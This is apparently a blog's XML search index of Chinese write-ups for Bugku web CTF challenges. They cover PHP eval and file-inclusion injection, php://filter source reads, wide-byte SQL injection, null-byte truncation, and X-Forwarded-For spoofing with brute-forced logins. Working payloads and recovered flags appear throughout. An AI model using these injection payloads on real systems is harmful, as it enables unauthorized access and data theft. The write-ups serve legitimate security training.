<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%2F</url>
    <content type="text"><![CDATA[本地包含题目链接：http://123.206.87.240:8003/ 打开题目代码如下 123456&lt;?php include &quot;flag.php&quot;; #说明文件在本地 $a = @$_REQUEST[&apos;hello&apos;]; #将$a赋值，描述了$_REQUEST全局变量，定义了hello为全局变量，可控 eval( &quot;var_dump($a);&quot;); #将$a打印对hello进行赋值 show_source(__FILE__); #显示文件路径?&gt; 首先看到全局变量 $_REQUEST,说明了hello变量，是可以控制的，所以无论在url栏中对hello赋任何值，都会全盘接受$_REQUEST函数12An associative array that by default contains the contents of $_GET, $_POST and $_COOKIE.默认情况下包含$_GET、$_POST和$_COOKIE内容的关联数组。 Var_dump()函数12var_dump—转储有关变量的信息函数作用是判断一个变量的类型与长度,并输出变量的数值,如果变量有值输的是变量的值并回返数据类型. var_dump（）是将a打印到界面中,在根据eval函数的特性(计算后面括号中的表达式)show_source()函数12show_source() 函数对文件进行语法高亮显示。可以理解为显示文件路径 eval函数1将字符串作为PHP代码来计算 方法1.利用show_source(),直接显示flag.php文件1?hello=show_source(&quot;flag.php&quot;) 2.直接对hello进行赋值得到flag值1?hello=file_get_concent(&apos;flag.php&apos;) 3.网上方法1?hello=1);print_r(file(&quot;./flag.php&quot;));%23 4.B站方法使用文件读取file:// 1？hello=file(&apos;flag.php&apos;)]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E5%8F%98%E9%87%8F1%2F</url>
    <content type="text"><![CDATA[变量1题目链接：http://123.206.87.240:8004/index1.php 代码： 12345678910111213flag In the variable ! &lt;?php error_reporting(0);include "flag1.php"; #说明文件在本地highlight_file(__file__);if(isset($_GET['args']))&#123; #get方式传值，变量条件 $args = $_GET['args']; #赋值args if(!preg_match("/^\w+$/",$args))&#123; #引用变量 die("args error!"); &#125; eval("var_dump($$args);"); #引用变量&#125;?&gt; 方法：这道题利用了$GLOBALS变量因为args引用了变量，所以进行构造1http://123.206.87.240:8004/index1.php?args=GLOBALS 得到flag值GLOBAS() 函数http://www.runoob.com/python/python-func-globals.html 1globals() 函数会以字典类型返回当前位置的全部全局变量。 highlight_file() 函数1函数对文件进行语法高亮显示。 isset() 函数1isset() — 检测变量是否设置。]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag%2F</url>
    <content type="text"><![CDATA[输入密码查看flag链接：http://123.206.87.240:8002/baopo/ 进入题目，是一个密码输入框，提示你输入五位数的密码，因为什么没有提示 使用Burp进行暴库 具体流程就不说了 最后的密码是 1537得到flag值 1flag&#123;bugku-baopo-hah&#125;]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[管理员系统链接：http://123.206.31.85:1003/ 看一下题目是一个登录页面 管理员系统Username: Password: Submit Reset 输入弱口令amin提示：IP禁止访问，请联系本地管理员登陆，IP已被记录.思路和方法XFF伪造1.有这么个思路，既然其他IP被禁止登录可以伪造本地管理员IP登录，可以用XFF伪造X-Forwarded-For123简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP 用处：伪造IP 2.先看源码是否给与提示，没有的话使用Burp进行暴库123456789101112131415161718192021222324252627&lt;html&gt;&lt;head&gt;&lt;title&gt;管理员系统&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;管理员系统&lt;/h1&gt;&lt;form method="POST" autocomplete="off"&gt;&lt;p&gt;Username: &lt;input type="text" name="user" id="user"&gt;&lt;/p&gt;&lt;p&gt;Password: &lt;input type="password" name="pass" id="pass"&gt;&lt;/p&gt;&lt;p&gt;&lt;input type="submit" value="Submit"/&gt; &lt;input type="reset" value="Reset"/&gt;&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- dGVzdDEyMw== --&gt; 在最后一行有个base64加密，进行解密，使用Burp工具即可，Decoder进行解密这就是密码1&lt;!-- test123 --&gt; 3.获取账号A.可以使用Burp进行暴库，设置好字典B.使用弱口令进行尝试1获取到账号为 admin 4.伪造IP进行本地登录添加一条X-Forwarded-For 1X-Forwarded-For:127.0.0.1 123456789101112POST / HTTP/1.1Host: 123.206.31.85:1003User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Referer: http://123.206.31.85:1003/Content-Type: application/x-www-form-urlencodedContent-Length: 23Connection: closeX-Forwarded-For:127.0.0.1user=admin&amp;pass=test123 5.放包获得flag值12345678910111213141516171819202122232425262728HTTP/1.1 200 OKServer: nginxDate: Thu, 03 Jan 2019 00:52:13 GMTContent-Type: text/htmlConnection: closeContent-Length: 5480ï»¿&lt;html&gt;&lt;head&gt;&lt;title&gt;ç®¡çåç³»ç»&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;ç®¡çåç³»ç»&lt;/h1&gt;&lt;form method="POST" autocomplete="off"&gt;&lt;p&gt;Username: &lt;input type="text" name="user" id="user"&gt;&lt;/p&gt;&lt;p&gt;Password: &lt;input type="password" name="pass" id="pass"&gt;&lt;/p&gt;&lt;p&gt;&lt;input type="submit" value="Submit"/&gt; &lt;input type="reset" value="Reset"/&gt;&lt;/p&gt;&lt;/form&gt;&lt;font style="color:#FF0000"&gt;&lt;h3&gt;The flag is: 85ff2ee4171396724bae20c0bd851f6b&lt;/h3&gt;&lt;br\&gt;&lt;/font\&gt;&lt;/body&gt;&lt;/html&gt; 1flag is: 85ff2ee4171396724bae20c0bd851f6b]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91%2F</url>
    <content type="text"><![CDATA[网站被黑链接：http://123.206.87.240:8002/webshell/ 进入题目提示网页被黑 一般是有后门漏洞，使用御剑进行扫描扫描出两个网址，这个网址是一个管理员的登录地址 1http://123.206.87.240:8002/webshell//shell.php 这个是index.php文件页面，黑页 1http://123.206.87.240:8002/webshell//index.php 方法思路： 1.既然扫出了管理后台，那么说明管理后台存在弱口令 2.利用Burp进行暴库 3.在管理地址随便输入进行抓包，给Intruder进行暴库 4.设置好Payloads，将字典写入，进行暴库即可，开始在右上角 5.跑完之后点一下Length查看不同长度的密码，就是跑出来的密码，没有的话添加hack到字典 得到flagWebShell PASS:hack flag{hack_bug_ku035}]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E7%9F%9B%E7%9B%BE%2F</url>
    <content type="text"><![CDATA[5.矛盾试题链接http://123.206.87.240:8002/get/index1.php 1.查看题目 1is_numeric（）函数检测变量是否为数字或数字字符串 1! 为逻辑运算符 所以num必须是数字，接着往下看定义了 num 是数字或字符串，输出num，如果num =1则输出flag值 1234567$num=$_GET['num'];if(!is_numeric($num))&#123;echo $num;if($num==1)echo 'flag&#123;**********&#125;';&#125; 因为第一眼看到了GET函数，直接在URL地址栏中尝试 但是没有返回flag值 1http://123.206.87.240:8002/get/index1.php?num=1 继续尝试其他方式 使用00截断将1后的字符串截断，发现可以返回了flag值 123456789http://123.206.87.240:8002/get/index1.php？num=1%00$num=$_GET['num'];if(!is_numeric($num))&#123;echo $num;if($num==1)echo 'flag&#123;**********&#125;';&#125;1flag&#123;bugku-789-ps-ssdf&#125; 又做了一个类似的题目，南邮CTF的题 链接：http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php 源码 1234isset() — 检测变量是否设置。strpos() — 查找 &quot;php&quot; 在字符串中第一次出现的位置die() 函数输出一条消息，并退出当前脚本。ereg 正则表达式，指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 这道题和bugku的题类似 先定义了必须是数字，也是GET方式，说明可以在地址栏直接输入 大概意思是，定义了 nctf必须是数字，并检测是否为数字，?nctf=1-9并加上注释#biubiubiu则输出flag值，如果接近答案则输出“骚年，继续努力吧”，正确则输出flag值 12345678910view-source: if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 还是GET传值利用00截断，得到flag值，首先尝试了一下 12345678910111213http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php？nctf=1%00#biubiubiu骚年，继续努力吧啊~ view-source: if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125;接近答案了，但是没有输出flag值，百度一下 百度发现，就是浏览器会对#的编码问题，浏览器会把#编码为空，也就没有发送出#，应为#是url编码里的特殊字符，所以将#转化为url编码为%23，在火狐插件中有转换工具HEX Encoding #–&gt;23 将转换之后的#写到url中 这里添加一个%号，意思为注明字符 12345nctf=1%00%23biubiubiuhttp://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiuFlag: flag:nctf&#123;use_00_to_jieduan&#125; 直接得到flag值 相关知识： 关于00截断做了一下午的00截断的习题，总结了几点 11.起到截断作用，第一题因为is_numeric（）函数遇到%00截断的漏洞 12.第二题因为ereg也遇到了0x00漏洞 （不太算%00截断漏洞） 123456783.文件上传的0x00漏洞：0x00截断原理，具体原理是 系统在对文件名的读取时，如果遇到0x00，就会认为读取已 结束。 总之就是利用ascii码为零这个特殊字符，让系统认为字符串已经结束。 例如一个字符串为 1.ph p a--------- 16进制为0x20 ascii为 20 改为 00 发生变化 1.ph pa---------- 16进制为0x00 ascii为 00 可以看出变化 ascii码为零个特殊字符，让系统认为字符串已经结束。 14.就是将后面的字符截断，以为已经结束 关于%00截断上传漏洞 php 版本需满足 php 版本&lt;5.3.4 才有可能存在此漏洞]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2F%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A1%2F</url>
    <content type="text"><![CDATA[点击一百万次链接：http://123.206.87.240:9001/test/ 挺有意思的，两种方法 1.是真的点击一百万次 2.是利用火狐hackbar插件 右击源代码 看到这样一段PHP代码 12345678910111213141516171819202122 &lt;script&gt; var clicks=0 $(function() &#123; $("#cookie") .mousedown(function() &#123; $(this).width('350px').height('350px'); &#125;) .mouseup(function() &#123; $(this).width('375px').height('375px'); clicks++; $("#clickcount").text(clicks); if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; &#125;); &#125;); &lt;/script&gt;&lt;/html&gt; clicks这是重点利用火狐插件在POST中输入 1clicks=1000000 获得flag值 1flag&#123;Not_C00kI3Cl1ck3r&#125;]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2FSQL%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[SQL注入1(已挂)题目：访问参数为：?id=x 查找表为key的数据表，id=1值hash字段值 代码 1234567891011121314//过滤sql$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit(&apos;包含敏感关键字！&apos;.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;; strip_tags（）函数剥去字符串中的 HTML 标签： 当前结果： id 1 title title 方法：利用宽字节即可拿到题以后，还是老套路，and 1=1和and 1=2 看看是否带入查询，但是这个题目在?id=1和?id=1’两种条件下都不报错，查看页面源代码发现gb2312于是尝试宽字节注入。?id=1%bf’ union select 1,2%23 来确定回显1?id=1%df%27%20union%20select%201,2%23 1.?id=1%bf’ union select 1,database()%23查询数据库名称为sql5，查询key表，id=1的string字段 id 1 key fdsafdasfdsa id 1 key sql5 2.?id=1%bf’ union select 1,string from sql5.key%23 然后查询key表,id=1的string字段。 id 1 key fdsafdasfdsa id 1 key 54f3320dc261f313ba712eb3f13a1f6d id 1 key aaaaaaaaaa 得到flag，sql注入中的宽字节注入以及绕过等方面的问题可以说是难者不会，会者不难了，只要平时多学多练，这类题就会成为你的送分题。]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2FWEB3%2F</url>
    <content type="text"><![CDATA[6.WEB3链接：http://123.206.87.240:8002/web3/ 是一个简单的XSS循环,构造了大量的alert函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136&lt;html&gt; &lt;head&gt; &lt;title&gt;BKCTF-WEB3&lt;/title&gt; &lt;script language="javascript"&gt; alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); alert("flag就在这里"); alert("来找找吧"); &lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;&lt;/script&gt; &lt;/head&gt; &lt;/html&gt; 到了最后出现了flag值，但是被加密了，使用的是html加密，用Burp，或者在线工具直接解开 1&lt;!&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt; 1&lt;!--KEY&#123;J2sa42ahJK-HS11III&#125;--&gt;]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2FWEB4%2F</url>
    <content type="text"><![CDATA[WEB4链接：http://123.206.87.240:8002/web4/ 题目已经提示你查看源代码 在线unescape解密工具：https://escape.supfree.net/ 查看源代码123456789101112131415161718&lt;html&gt;&lt;title&gt;BKCTF-WEB4&lt;/title&gt;&lt;body&gt;&lt;div style="display:none;"&gt;&lt;/div&gt;&lt;form action="index.php" method="post" &gt;看看源代码？&lt;br&gt;&lt;br&gt;&lt;script&gt;var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));&lt;/script&gt;&lt;input type="input" name="flag" id="flag" /&gt; &lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 很明显，var p1和var p2的值是URL码，使用unescape解密得到如下源码 123456789101112131415161718&lt;html&gt;&lt;title&gt;BKCTF-WEB4&lt;/title&gt;&lt;body&gt;&lt;div style="display:none;"&gt;&lt;/div&gt;&lt;form action="index.php" method="post" &gt; ã&lt;br&gt;&lt;br&gt;&lt;script&gt;var p1 = 'function checkSubmit()&#123;var a=document.getElementById("password");if("undefined"!=typeof a)&#123;if("67d709b2b';var p2 = 'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1&#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;';eval(unescape(p1) + unescape('54aa2' + p2));&lt;/script&gt;&lt;input type="input" name="flag" id="flag" /&gt; &lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; FLAG出现将 p1,54aa2,p2加起来获得flag 167d709b2b54aa2aa648cf6e87a7114f1 提交获得FLAG值 看看源代码？ ​ Submit KEY{J22JK-HS11}]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2FWEB%E5%9F%BA%E7%A1%80%24_GET%2F</url>
    <content type="text"><![CDATA[3.WEB基础$_GET查看题目http://123.206.87.240:8002/get/ 1.get请求 只获取数据 放在url之中，通过?key=value&amp;key=value2.post请求 要对服务器产生影响 放在form Data中，通过key:value&amp;key=value 此处利用GET传值，意思是将what赋值给flag,才能输出flag值 1234$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 1234567http://123.206.87.240:8002/get/?what=flag#输出$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;';flagflag&#123;bugku_get_su8kej2en&#125; 相关知识点：1？：为连接符号，经常使用 1GET:get是把参数数据队列加到提交表单的ACTION属性所指的URL中 四种传输方式： 121.通过表单，这种形式和$_POST获取数据的方式很类似获取形式：$dataVar=$_GET[&apos;表单元素name属性的值&apos;]; 1232.通过地址栏，直接在地址栏中输入数据，也是本题使用的方法&lt;a href=”content.php?news_id=12&amp;cat=国内新闻”&gt;新闻标题&lt;/a&gt;$id=$_GET[‘news_id’];获取方式 12345678910113.通过JS跳转 所谓的js页面跳转就是利用javesrcipt对打开的页面ULR进行跳转，如我们打开的是A页面，通过javsrcipt脚本就会跳转到B页面。例如：&lt;a href=&quot;#&quot; onclick=&quot;location.href=&apos;content.php?news_id=12&amp;cat=国内新闻&apos;&quot;&gt;新闻标题&lt;/a&gt;从content.php跳转到国内新闻&lt;a href=&quot;#&quot; onclick=&quot;if(confirm(&apos;真的要删除吗？&apos;))location.href=&apos;content.php?id=100&apos;&quot;&gt;删除&lt;/a&gt;从onclick=&quot;if(confirm(&apos;真的要删除吗？&apos;))跳转到content.php?id=100&lt;a href=&quot;content.php?id=100&quot; onclick=&quot;return confirm(&apos;真的要删除么？&apos;)&quot;&gt;删除&lt;/a&gt;从content.php?id=100跳转到onclick=&quot;if(confirm(&apos;真的要删除吗？&apos;)) 获取方式都是一样的 1234&lt;?php $id=$_GET[‘news_id’];?&gt;都是获取表单元素 12344.header函数跳转&lt;?php header(‘location:content.php?id=14’)?&gt; 123&lt;?php $id=$_GET[&apos;id&apos;];?&gt; 123456789101112131415161718192021222324header() 函数向客户端发送原始的 HTTP 报头。 //设置一个404头: header('HTTP/1.1 404 Not Found'); //定义编码 header( 'Content-Type:text/html;charset=utf-8 '); //PDF header('Content-type: application/pdf'); // ok header('HTTP/1.1 200 OK'); //转到一个新地址 header('Location: http://www.example.org/'); //文档语言 header('Content-language: en'); //设置内容长度 header('Content-Length: 1234'); //设置内容类型: header('Content-Type: image/jpeg'); //JPG*** header('Content-Type: text/plain'); //纯文本格式 header('Content-Type: application/zip'); // ZIP文件header('Content-Type: application/pdf'); // PDF文件--------------------- 原文：https://blog.csdn.net/qq_41173457/article/details/81546043 1、虽然有四种形式，但究其根本，都是通过地址栏进行传值2、地址栏中传多个值，用&amp;连接，地址栏传值不能含有空格3、当表单的method为post时，可以有post和get两种传值方式a) 对于表单控件来说，此时必须用post传值方式b) 对于action属性来说，可以用get方式进行传值，如&lt;formmethod=”post” action=”news.php?id=100”&gt;4、当表单的method为get时a) 对表单控件来说，此时必须使用get传值方式b) 对于action属性来说，get传值无效]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2Fflag%E5%80%BC%E5%9C%A8index%E9%87%8C%2F</url>
    <content type="text"><![CDATA[flag值在index中链接：http://123.206.87.240:8005/post/ 先看题目，是一个超链接click me? no 打开显示 test5 看源码也没什么有价值的。。但是题目提示，flag值在index中，，直接想到base64读取index.php文件 这也是个小技巧，没有任何提示下使用base64读取 构造Payload1http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert-base64-encode/resource=index.php 返回了base64位码1PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== 解码为123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))&#123; echo "Oh no!"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 涉及知识：伪协议base64读取文件php://1php:// — 访问各个输入/输出流（I/O streams） 相关php伪协议：123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 伪协议原文地址：https://blog.csdn.net/u010726042/article/details/75041367 Base64位码PHP命令1file=php://filter/read=convert.base64-encode/resource=index.php 网上大佬解析base64含义1234567891011121314现在具体说说file=php://filter/read=convert.base64-encode/resource=index.php的含义首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。如果不进行base64编码传入，就会直接执行，而flag的信息在注释中，是得不到的--------------------- 作者：孤鸿影～ 来源：CSDN 原文：https://blog.csdn.net/zpy1998zpy/article/details/80585443 版权声明：本文为博主原创文章，转载请附上博文链接！ 链接：https://blog.csdn.net/zpy1998zpy/article/details/80585443]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2FWEB%E5%9F%BA%E7%A1%80%24_POST%2F</url>
    <content type="text"><![CDATA[4.web基础$_POST1.试题链接http://123.206.87.240:8002/post/ 1.get请求 只获取数据 放在url之中，通过?key=value&amp;key=value 2.post请求 要对服务器产生影响 放在form Data中，通过key:value&amp;key=value查看源码 利用了POST传值方式，利用POST进行传输数据，POST中what=flag即可出现flag 1234$what=$_POST['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; 利用火狐插件，在POST栏中输入 what=flag,便得出flag值 12345$what=$_POST['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;';flagflag&#123;bugku_get_ssseint67se&#125; 相关知识点：1从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏，其实在请求体中还是能看到的），并且对发送信息的量也没有限制(php默认是有限制的，默认post提交的数据不能大于8M，可以在PHP的配置文件中进行设置该限制) 12345POST是一个超全局变量，全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用$_POST变量是一个数组，内容是由 HTTP POST 方法发送的变量名称和值 POST 传递 ：将表单数据提交服务器的一种请求，要提交的数据位于信息头后面的实体中。post方式，通过http包进行传值POST方式可以上传附件 12$_POST变量用于收集来自 method=&quot;post&quot; 的表单中的值method=&quot;post&quot; 意思是当前的数据用post方法传递 在服务器端可用response.post(&quot;表单域名&quot;)来获得数据]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F06%2F03%2FWEB%E9%A2%98-bugku%2FWEB5%2F</url>
